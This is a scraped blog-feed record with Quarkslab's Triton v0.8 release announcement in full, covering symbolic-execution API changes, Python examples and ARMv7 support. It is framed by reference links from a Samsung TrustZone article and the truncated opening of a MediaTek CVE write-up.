\n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#id2\">[TRUST_ISSUES]</a></td> \n    <td><a class=\"reference external\" href=\"https://googleprojectzero.blogspot.com/2017/07/trust-issues-exploiting-trustzone-tees.html\">https://googleprojectzero.blogspot.com/2017/07/trust-issues-exploiting-trustzone-tees.html</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"sammobile\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#id1\">[SAMMOBILE]</a></td> \n    <td><a class=\"reference external\" href=\"https://www.sammobile.com/samsung/galaxy-s7/firmware/SM-G930F/XEF/download/G930FXXS5ESF8/276659/\">https://www.sammobile.com/samsung/galaxy-s7/firmware/SM-G930F/XEF/download/G930FXXS5ESF8/276659/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"bh2019\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[BH2019]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#id3\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#id5\">2</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#id24\">3</a>)</em> Breaking Samsung's ARM TrustZone &lt;<a class=\"reference external\" href=\"https://www.blackhat.com/us-19/briefings/schedule/#breaking-samsungs-arm-trustzone-14932\">https://www.blackhat.com/us-19/briefings/schedule/#breaking-samsungs-arm-trustzone-14932</a>&gt;</td> \n   </tr> \n  </tbody> \n </table> \n</div>","descriptionType":"html","publishedDate":"Wed, 01 Jul 2020 22:00:00 +0000","feedId":11110,"bgimg":"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/trustlet_vuln_memcpy_s7.png","linkMd5":"bcc1f00b70596b73ee173cdea133e02f","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn58@2020_2/2020/08/25/01-15-08-654_7b0da10a65302839.webp","destWidth":741,"destHeight":701,"sourceBytes":116645,"destBytes":42166,"author":"Alexandre Adamski","articleImgCdnMap":{"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/trustlet_vuln_memcpy_s7.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn58@2020_2/2020/08/25/01-15-08-654_7b0da10a65302839.webp","http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/trustlet_exploit_calldriver_s7.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn56@2020_2/2020/08/25/01-15-12-966_99eb3a43e813ccd7.webp","http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/secure_driver_vuln_memcpy_s7.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn47@2020_1/2020/08/25/01-15-14-404_5010c94271b208f4.webp"},"publishedOrCreatedDate":1598318092714},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"Triton v0.8 is Released!","link":"http://blog.quarkslab.com/triton-v08-is-released.html","description":"<p>We are pleased to announce that we released <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/releases/tag/v0.8\">Triton v0.8</a> under the terms of the Apache License 2.0 (same license as before). This new version provides bug fixes, features and improvements: the detailed list can be found on this <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/milestone/10?closed=1\">Github page</a> (there are about 297 changed files with 43,115 additions and 13,579 deletions). We wrote this blog post to highlight the most important changes from v0.7.</p> \n<div class=\"section\" id=\"what-s-new-in-v0-8\"> \n <h2>What's new in v0.8?</h2> \n <p>First of all, we would like to thank the following contributors who helped make Triton a bit more powerful every day during the development of v0.8 (thanks all, you are amazing!):</p> \n <ul class=\"simple\"> \n  <li><a class=\"reference external\" href=\"https://github.com/aguinet\">Adrien Guinet</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/illera88\">Alberto Garcia Illera</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/nurmukhametov\">Alexey Nurmukhametov</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/SweetVishnya\">Alexey Vishnyakov</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/XVilka\">Anton Kochkov</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/bennofs\">Benno Fünfstück</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/cnheitman\">Christian Heitman</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/0xeb\">Elias Bachaalany</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/igogo-x86\">Igor Kirillov</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/werew\">Luigi Coniglio</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/masthoon\">Mastho</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/fvrmatteo\">Matteo F.</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/meme\">Meme</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/archercreat\">Pavel</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/pmeerw\">Peter Meerwald-Stadler</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/PixelRick\">PixelRick</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/RobinDavid\">Robin David</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/technateNG\">TechnateNG</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/Toizi\">Toizi</a></li> \n  <li><a class=\"reference external\" href=\"https://github.com/aegiryy\">Xinyang Ge</a></li> \n </ul> \n <p>The following sub-sections introduce some major improvements between the v0.7 and v0.8 versions.</p> \n <div class=\"section\" id=\"implicit-concretization-when-setting-a-concrete-value\"> \n  <h3>1 - Implicit concretization when setting a concrete value</h3> \n  <p>Thread: <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/issues/808\">#808</a>.</p> \n  <p>Triton keeps at each program point a concrete and a symbolic state. When the user modifies a concrete value at a specific program point, it may imply a de-synchronization between those two states and, before v0.8, the user had to force the re-synchronization by concretizing registers or memory cells. For example, we could have a snippet like this:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">setConcreteRegisterValue</span><span class=\"p\">(</span><span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">registers</span><span class=\"o\">.</span><span class=\"n\">rax</span><span class=\"p\">,</span> <span class=\"mh\">0x1234</span><span class=\"p\">)</span>\n<span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">concretizeRegister</span><span class=\"p\">(</span><span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">registers</span><span class=\"o\">.</span><span class=\"n\">rax</span><span class=\"p\">)</span> <span class=\"c1\"># concretize the register which points to an old symbolic expression</span>\n</pre> \n  </div> \n  <p>With v0.8 you should have something like this:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">setConcreteRegisterValue</span><span class=\"p\">(</span><span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">registers</span><span class=\"o\">.</span><span class=\"n\">rax</span><span class=\"p\">,</span> <span class=\"mh\">0x1234</span><span class=\"p\">)</span> <span class=\"c1\"># implicit concretization</span>\n</pre> \n  </div> \n </div> \n <div class=\"section\" id=\"dealing-with-the-path-predicate\"> \n  <h3>2 - Dealing with the path predicate</h3> \n  <p>Thread: <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/issues/350\">#350</a>.</p> \n  <p>During the execution, Triton builds the path predicate when it encounters conditional instructions. We provided some new methods which allow the user to deal a bit better with the path predicate. It's now possible to:</p> \n  <ul class=\"simple\"> \n   <li>remove the last constraint added to the path predicate using <tt class=\"docutils literal\">popPathConstraint()</tt>;</li> \n   <li>add new constraints using <tt class=\"docutils literal\">pushPathConstraint()</tt>;</li> \n   <li>clear the current path predicate using <tt class=\"docutils literal\">clearPathConstraints()</tt>.</li> \n  </ul> \n  <p>We also provided a new method which returns the path predicate to target a basic block address if this one is reachable during the execution (do not forget that we are in a dynamic analysis context): <tt class=\"docutils literal\">getPredicatesToReachAddress()</tt>.</p> \n  <p>For example, let's consider at one point we want to add a post condition on our path predicate, such as <tt class=\"docutils literal\">rax</tt> must be different from 0. The snippet of code should look like this:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"k\">if</span> <span class=\"n\">inst</span><span class=\"o\">.</span><span class=\"n\">getAddress</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"p\">[</span><span class=\"n\">my</span> <span class=\"n\">target</span> <span class=\"n\">address</span><span class=\"p\">]:</span>\n    <span class=\"n\">rax</span> <span class=\"o\">=</span> <span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">getRegisterAst</span><span class=\"p\">(</span><span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">registers</span><span class=\"o\">.</span><span class=\"n\">rax</span><span class=\"p\">)</span>\n    <span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">pushPathConstraint</span><span class=\"p\">(</span><span class=\"n\">rax</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span><span class=\"p\">)</span>\n</pre> \n  </div> \n </div> \n <div class=\"section\" id=\"the-constant-folding-optimization\"> \n  <h3>3 - The CONSTANT_FOLDING optimization</h3> \n  <p>Thread: <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/issues/835\">#835</a>.</p> \n  <p>We added a new optimization which performs a constant folding at the build time of AST nodes. This optimization is pretty similar to <tt class=\"docutils literal\">ONLY_ON_SYMBOLIZED</tt> except that the concretization occurs at each level of the AST during its construction while <tt class=\"docutils literal\">ONLY_ON_SYMBOLIZED</tt> only checks if a root node of a symbolic expression contains symbolic variables (which does not concretize sub-trees if it is true).</p> \n </div> \n <div class=\"section\" id=\"converting-a-z3-expression-to-a-triton-expression\"> \n  <h3>4 - Converting a Z3 expression to a Triton expression</h3> \n  <p>Thread: <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/issues/850\">#850</a>.</p> \n  <p>It's now possible to convert a Z3 expression into a Triton expression and vice versa using Python bindings. Before v0.8, the conversion from z3 to Triton was only possible with the C++ API.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"kn\">from</span> <span class=\"nn\">triton</span> <span class=\"kn\">import</span> <span class=\"o\">*</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">ctx</span> <span class=\"o\">=</span> <span class=\"n\">TritonContext</span><span class=\"p\">(</span><span class=\"n\">ARCH</span><span class=\"o\">.</span><span class=\"n\">X86_64</span><span class=\"p\">)</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">ast</span> <span class=\"o\">=</span> <span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">getAstContext</span><span class=\"p\">()</span>\n\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"n\">ast</span><span class=\"o\">.</span><span class=\"n\">variable</span><span class=\"p\">(</span><span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">newSymbolicVariable</span><span class=\"p\">(</span><span class=\"mi\">8</span><span class=\"p\">))</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">y</span> <span class=\"o\">=</span> <span class=\"n\">ast</span><span class=\"o\">.</span><span class=\"n\">variable</span><span class=\"p\">(</span><span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">newSymbolicVariable</span><span class=\"p\">(</span><span class=\"mi\">8</span><span class=\"p\">))</span>\n\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">x</span> <span class=\"o\">+</span> <span class=\"n\">y</span> <span class=\"o\">*</span> <span class=\"mi\">2</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">n</span><span class=\"p\">)</span>\n<span class=\"p\">(</span><span class=\"n\">bvadd</span> <span class=\"n\">SymVar_0</span> <span class=\"p\">(</span><span class=\"n\">bvmul</span> <span class=\"n\">SymVar_1</span> <span class=\"p\">(</span><span class=\"n\">_</span> <span class=\"n\">bv2</span> <span class=\"mi\">8</span><span class=\"p\">)))</span>\n\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">z3n</span> <span class=\"o\">=</span> <span class=\"n\">ast</span><span class=\"o\">.</span><span class=\"n\">tritonToZ3</span><span class=\"p\">(</span><span class=\"n\">n</span><span class=\"p\">)</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"nb\">type</span><span class=\"p\">(</span><span class=\"n\">z3n</span><span class=\"p\">))</span>\n<span class=\"o\">&lt;</span><span class=\"k\">class</span> <span class=\"err\">'</span><span class=\"nc\">z3</span><span class=\"o\">.</span><span class=\"n\">z3</span><span class=\"o\">.</span><span class=\"n\">ExprRef</span><span class=\"s1\">'&gt;</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">z3n</span><span class=\"p\">)</span>\n<span class=\"n\">SymVar_0</span> <span class=\"o\">+</span> <span class=\"n\">SymVar_1</span><span class=\"o\">*</span><span class=\"mi\">2</span>\n\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">ttn</span> <span class=\"o\">=</span> <span class=\"n\">ast</span><span class=\"o\">.</span><span class=\"n\">z3ToTriton</span><span class=\"p\">(</span><span class=\"n\">z3n</span><span class=\"p\">)</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"nb\">type</span><span class=\"p\">(</span><span class=\"n\">ttn</span><span class=\"p\">))</span>\n<span class=\"o\">&lt;</span><span class=\"k\">class</span> <span class=\"err\">'</span><span class=\"nc\">AstNode</span><span class=\"s1\">'&gt;</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">ttn</span><span class=\"p\">)</span>\n<span class=\"p\">(</span><span class=\"n\">bvadd</span> <span class=\"n\">SymVar_0</span> <span class=\"p\">(</span><span class=\"n\">bvmul</span> <span class=\"n\">SymVar_1</span> <span class=\"p\">(</span><span class=\"n\">_</span> <span class=\"n\">bv2</span> <span class=\"mi\">8</span><span class=\"p\">)))</span>\n</pre> \n  </div> \n </div> \n <div class=\"section\" id=\"recursive-calls-of-shared-ptr-destructors\"> \n  <h3>5 - Recursive calls of shared_ptr destructors</h3> \n  <p>Thread: <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/issues/753\">#753</a>.</p> \n  <p>We use <tt class=\"docutils literal\">shared_ptr</tt> to determine if an AST is still assigned to registers or memory cells. If the reference number of a <tt class=\"docutils literal\">shared_ptr</tt> is zero, it means that the current state of the execution does not need this AST anymore and we destroy it in order to free the memory. On paper this idea looks good but there is a specific scenario where it causes an issue. To really highlight the issue, we have to understand that when a parent P has two children C1 and C2, these children may also have other children etc. (classical AST form). Each node is a <tt class=\"docutils literal\">shared_ptr</tt> and possesses a list of children which are <tt class=\"docutils literal\">shared_ptr</tt> (<tt class=\"docutils literal\"><span class=\"pre\">std::vector&lt;std::shared_ptr&lt;AbstractNode&gt;&gt;</span> children</tt>). When the root node P has no more reference to itself, the <tt class=\"docutils literal\">shared_ptr</tt> calls its destructor and then the vector list of its children is cleared which decreases the number of references to these children which may call their destructors and so on. On a deep AST, in versions prior to v0.8, this scenario leads to a stack overflow due to the recursion of <tt class=\"docutils literal\">shared_ptr</tt> destruction. For example, the following snippet of code triggers the bug (on Linux you can set a small stack size before running this example: <tt class=\"docutils literal\">ulimit <span class=\"pre\">-s</span> 1024</tt>).</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"kn\">from</span> <span class=\"nn\">triton</span> <span class=\"kn\">import</span> <span class=\"o\">*</span>\n\n<span class=\"n\">ctx</span> <span class=\"o\">=</span> <span class=\"n\">TritonContext</span><span class=\"p\">(</span><span class=\"n\">ARCH</span><span class=\"o\">.</span><span class=\"n\">X86_64</span><span class=\"p\">)</span>\n\n<span class=\"c1\"># Create a deep AST with a reference to previous nodes</span>\n<span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">10000</span><span class=\"p\">):</span>\n    <span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">processing</span><span class=\"p\">(</span><span class=\"n\">Instruction</span><span class=\"p\">(</span><span class=\"sa\">b</span><span class=\"s2\">\"</span><span class=\"se\">\\x48\\xff\\xc0</span><span class=\"s2\">\"</span><span class=\"p\">))</span> <span class=\"c1\"># inc rax</span>\n\n<span class=\"c1\"># Assign a new AST on rax. The previous AST assigned to rax has no more</span>\n<span class=\"c1\"># reference and shared_ptr start to destroy themself.</span>\n<span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">processing</span><span class=\"p\">(</span><span class=\"n\">Instruction</span><span class=\"p\">(</span><span class=\"sa\">b</span><span class=\"s2\">\"</span><span class=\"se\">\\x48\\xc7\\xc0\\x00\\x00\\x00\\x00</span><span class=\"s2\">\"</span><span class=\"p\">))</span> <span class=\"c1\"># mov rax, 0</span>\n</pre> \n  </div> \n  <p>I know what you will say \"<em>lol, Triton is easily breakable</em>\". Well, it's true for this scenario (even if we never found this case in real programs) but it's a real problem of using <tt class=\"docutils literal\">shared_ptr</tt> on AST (so think twice before using them on AST).</p> \n  <p>So now, how can we solve it? A solution could be to keep a reference to every node in the AST manager (<tt class=\"docutils literal\">AstContext</tt> class) and destroy each <tt class=\"docutils literal\">shared_ptr</tt> with only one reference <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/triton-v08-is-released.html#id7\" id=\"id6\">[1]</a> in a specific order (from down to up). The problem is that we really want to keep a scalable garbage collector and this solution does not scale at all (we deal with billions of nodes).</p> \n  <p>Our solution is to only keep references to nodes which belong to a depth in the AST which is a multiple of 10000. Thus, when the root node is destroyed, the stack recursivity stops when the depth level of 10000 is reached, because the nodes there still have a reference to them in the AST manager. The destruction will continue at the next allocation of nodes and so on. So, it means that ASTs are destroyed by steps of depth of 10000 which avoids the overflow while keeping a good scale. We did some benchmark about this new concept and it does not impact the performance and it solves the issue so far.</p> \n  <table class=\"docutils footnote\" frame=\"void\" id=\"id7\" rules=\"none\"> \n   <colgroup> \n    <col class=\"label\" /> \n    <col /> \n   </colgroup> \n   <tbody valign=\"top\"> \n    <tr> \n     <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/triton-v08-is-released.html#id6\">[1]</a></td> \n     <td>The reference kept in the AST manager.</td> \n    </tr> \n   </tbody> \n  </table> \n </div> \n <div class=\"section\" id=\"the-quantifier-operator-forall\"> \n  <h3>6 - The quantifier operator: forall</h3> \n  <p>Thread: <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/issues/860\">#860</a>.</p> \n  <p>After reading a nice <a class=\"reference external\" href=\"https://blog.regehr.org/archives/1636\">blog post</a> about constant synthesizing, we thought it could be interesting to add the quantifier operator: forall. For example, let's assume we want to synthesize the following expression <tt class=\"docutils literal\">((x &lt;&lt; 8) &gt;&gt; 16) &lt;&lt; 8</tt> into <tt class=\"docutils literal\">x &amp; 0xffff00</tt> where <tt class=\"docutils literal\">x</tt> is a 32-bit vector and the constant <tt class=\"docutils literal\">0xffff00</tt> is the unknown. The SMT query looks like this:</p> \n  <div class=\"highlight\"> \n   <pre><span></span>(declare-fun C () (_ BitVec 32))\n(assert (forall\n            ((x (_ BitVec 32)))\n            (=\n                (bvand x C)\n                (bvshl (bvlshr (bvshl x (_ bv8 32)) (_ bv16 32)) (_ bv8 32))\n            )\n        )\n)\n(check-sat)\n(get-model)\n</pre> \n  </div> \n  <p>The illustrated SMT query can be read as: <em>There exists a constant C such that for all x the expression x &amp; C is equal to ((x &lt;&lt; 8) &gt;&gt; 16) &lt;&lt; 8</em>. To handle such query in Python with v0.8, you could have a snippet of code like the following:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"ch\">#!/usr/bin/env python</span>\n<span class=\"c1\">## -*- coding: utf-8 -*-</span>\n<span class=\"c1\">##</span>\n<span class=\"c1\">##   $ python ./example.py</span>\n<span class=\"c1\">##   {1: C:32 = 0xffff00}</span>\n<span class=\"c1\">##</span>\n\n<span class=\"kn\">from</span> <span class=\"nn\">triton</span> <span class=\"kn\">import</span> <span class=\"o\">*</span>\n\n<span class=\"n\">ctx</span> <span class=\"o\">=</span> <span class=\"n\">TritonContext</span><span class=\"p\">(</span><span class=\"n\">ARCH</span><span class=\"o\">.</span><span class=\"n\">X86_64</span><span class=\"p\">)</span>\n<span class=\"n\">ast</span> <span class=\"o\">=</span> <span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">getAstContext</span><span class=\"p\">()</span>\n\n<span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"n\">ast</span><span class=\"o\">.</span><span class=\"n\">variable</span><span class=\"p\">(</span><span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">newSymbolicVariable</span><span class=\"p\">(</span><span class=\"mi\">32</span><span class=\"p\">))</span>\n<span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">ast</span><span class=\"o\">.</span><span class=\"n\">variable</span><span class=\"p\">(</span><span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">newSymbolicVariable</span><span class=\"p\">(</span><span class=\"mi\">32</span><span class=\"p\">))</span>\n\n<span class=\"n\">x</span><span class=\"o\">.</span><span class=\"n\">getSymbolicVariable</span><span class=\"p\">()</span><span class=\"o\">.</span><span class=\"n\">setAlias</span><span class=\"p\">(</span><span class=\"s1\">'x'</span><span class=\"p\">)</span>\n<span class=\"n\">c</span><span class=\"o\">.</span><span class=\"n\">getSymbolicVariable</span><span class=\"p\">()</span><span class=\"o\">.</span><span class=\"n\">setAlias</span><span class=\"p\">(</span><span class=\"s1\">'C'</span><span class=\"p\">)</span>\n\n<span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">getModel</span><span class=\"p\">(</span><span class=\"n\">ast</span><span class=\"o\">.</span><span class=\"n\">forall</span><span class=\"p\">([</span><span class=\"n\">x</span><span class=\"p\">],</span> <span class=\"p\">((</span><span class=\"n\">x</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">8</span><span class=\"p\">)</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">16</span><span class=\"p\">)</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">8</span> <span class=\"o\">==</span> <span class=\"n\">x</span> <span class=\"o\">&amp;</span> <span class=\"n\">c</span><span class=\"p\">)))</span>\n</pre> \n  </div> \n </div> \n <div class=\"section\" id=\"changes-to-the-user-api\"> \n  <h3>7 - Changes to the user API</h3> \n  <p>Threads: <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/issues/812\">#812</a>, <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/issues/864\">#864</a>, <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/issues/865\">#865</a> and <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/issues/866\">#866</a>.</p> \n  <p>The following v0.7 functions are deprecated and must be replaced by their v0.8 equivalent.</p> \n  <table border=\"1\" class=\"docutils\"> \n   <colgroup> \n    <col width=\"51%\" /> \n    <col width=\"49%\" /> \n   </colgroup> \n   <thead valign=\"bottom\"> \n    <tr> \n     <th class=\"head\">v0.7</th> \n     <th class=\"head\">v0.8</th> \n    </tr> \n   </thead> \n   <tbody valign=\"top\"> \n    <tr> \n     <td>convertExpressionToSymbolicVariable</td> \n     <td>symbolizeExpression</td> \n    </tr> \n    <tr> \n     <td>convertMemoryToSymbolicVariable</td> \n     <td>symbolizeMemory</td> \n    </tr> \n    <tr> \n     <td>convertRegisterToSymbolicVariable</td> \n     <td>symbolizeRegister</td> \n    </tr> \n    <tr> \n     <td>enableMode</td> \n     <td>setMode</td> \n    </tr> \n    <tr> \n     <td>getPathConstraintsAst</td> \n     <td>getPathPredicate</td> \n    </tr> \n    <tr> \n     <td>getSymbolicExpressionFromId</td> \n     <td>getSymbolicExpression</td> \n    </tr> \n    <tr> \n     <td>getSymbolicVariableFromId</td> \n     <td>getSymbolicVariable</td> \n    </tr> \n    <tr> \n     <td>getSymbolicVariableFromName</td> \n     <td>getSymbolicVariable</td> \n    </tr> \n    <tr> \n     <td>isMemoryMapped</td> \n     <td>isConcreteMemoryValueDefined</td> \n    </tr> \n    <tr> \n     <td>isSymbolicExpressionIdExists</td> \n     <td>isSymbolicExpressionExists</td> \n    </tr> \n    <tr> \n     <td>lookingForNodes</td> \n     <td>search</td> \n    </tr> \n    <tr> \n     <td>newSymbolicVariable(size, comment=\"\")</td> \n     <td>newSymbolicVariable(size, alias=\"\")</td> \n    </tr> \n    <tr> \n     <td>symbolizeExpression(id, size, comment=\"\")</td> \n     <td>symbolizeExpression(id, size, alias=\"\")</td> \n    </tr> \n    <tr> \n     <td>symbolizeMemory(mem, comment=\"\")</td> \n     <td>symbolizeExpression(mem, alias=\"\")</td> \n    </tr> \n    <tr> \n     <td>symbolizeRegister(reg, comment=\"\")</td> \n     <td>symbolizeExpression(reg, alias=\"\")</td> \n    </tr> \n    <tr> \n     <td>unmapMemory</td> \n     <td>clearConcreteMemoryValue</td> \n    </tr> \n    <tr> \n     <td>unrollAst</td> \n     <td>unroll</td> \n    </tr> \n   </tbody> \n  </table> \n </div> \n <div class=\"section\" id=\"armv7-support\"> \n  <h3>8 - ARMv7 support</h3> \n  <p>Thread: <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/issues/831\">#831</a>.</p> \n  <p>Last but not least, Triton v0.8 introduces yet another architecture: ARMv7. With this new inclusion, Triton now has support for the most popular architectures, namely: x86, x86-64, ARM32 and AArch64.</p> \n  <p>The ubiquity of ARM processors is one of the main reasons for adding support for ARMv7 in Triton. ARMv7 is a widely popular architecture, particularly in embedded devices and mobile phones. We wanted to bring the advantages of Triton to this architecture (most tools are prepared to work on Intel x86/x86_64 only). The other reason is to show the flexibility and extensibility of Triton. ARMv7 poses some challenges in terms of implementation given its many features and peculiarities (some of them quite different from the rest of the supported architectures). Therefore, ARMv7 makes a great architecture to add to the list of supported ones.</p> \n  <p>You can start by checking some of the <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/tree/master/src/examples/python/ctf-writeups/custom-crackmes/arm32-hash\">available samples</a>.</p> \n </div> \n</div> \n<div class=\"section\" id=\"plans-for-v0-9\"> \n <h2>Plans for v0.9</h2> \n <p>About the v0.9 version, our first plan is to integrate the <a class=\"reference external\" href=\"http://smtlib.cs.uiowa.edu/logics.shtml\">SMT Array logic</a> which will allow the user to symbolically index memory accesses. This new memory model will not replace the current one dealing with <a class=\"reference external\" href=\"http://smtlib.cs.uiowa.edu/logics-all.shtml#QF_BV\">BV</a> only. Our idea is to provide two memory models, BV and <a class=\"reference external\" href=\"http://smtlib.cs.uiowa.edu/logics-all.shtml#QF_ABV\">ABV</a>, and the user will be able to switch from one to the other according to his/her objectives. Our second plan is to improve the taint analysis integrated in Triton. Currently, the taint engine is mono-color with an over-approximation making it not really usable as a standalone analysis (it is mainly relevant when combined with the symbolic engine). So our idea is to provide a multi-colors and bit-level taint analysis based on the semantics of the Triton IR instead of the instruction semantics or to make it independent of the AST construction.</p> \n</div> \n<div class=\"section\" id=\"conclusion\"> \n <h2>Conclusion</h2> \n <p>It has been almost seven months since Triton v0.7. There were a lot of performance improvements regarding the execution speed and the memory consumption and we cannot describe all of them in this blog post but are present in this new version. (you can check them on this <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/milestone/10?closed=1\">Github page</a>). We only highlighted the most notorious changes from the last version. We hope you find the many features and improvements worth the wait. Now it's time for you to give it a try.</p> \n <p>Stay tuned for more news on Triton!</p> \n</div> \n<div class=\"section\" id=\"acknowledgments\"> \n <h2>Acknowledgments</h2> \n <ul class=\"simple\"> \n  <li>Thanks to all contributors!</li> \n  <li>Thanks to all our Quarkslab colleagues who proofread this article.</li> \n </ul> \n</div>","descriptionType":"html","publishedDate":"Wed, 22 Apr 2020 22:00:00 +0000","feedId":11110,"bgimg":"","linkMd5":"800cfa18dd23896111f4097de6c039e9","bgimgJsdelivr":"","metaImg":"","author":"Christian Heitman","publishedOrCreatedDate":1598318092717},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"CVE-2020-0069: Autopsy of the Most Stable MediaTek Rootkit","link":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html","description":"<div class=\"section\" id=\"introduction\"> \n <h2>Introduction</h2> \n <p>In March 2020, Google patched a critical vulnerability affecting many MediaTek based devices <a class=\"footnote-reference\" 